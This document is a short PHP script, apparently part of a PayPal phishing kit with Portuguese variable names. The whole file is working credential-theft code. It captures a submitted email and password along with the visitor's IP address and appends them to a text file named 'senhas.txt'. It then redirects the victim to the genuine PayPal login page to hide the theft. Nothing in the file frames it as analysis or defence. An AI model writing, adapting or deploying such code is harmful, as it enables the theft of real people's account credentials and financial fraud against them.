<?php
$conta = $_POST['login_email'];
$senha = $_POST['login_password'];
$ip = $_SERVER['REMOTE_ADDR'];
$tudo = "login_email: ".$conta." - login_password:".$senha." - IP: ".$ip."<br>"; 

$fp = fopen("senhas.txt", "a");
fwrite($fp, $tudo);
fclose($fp);
header("Location: https://www.paypal.com/de/cgi-bin/webscr?cmd=_login-run");
?>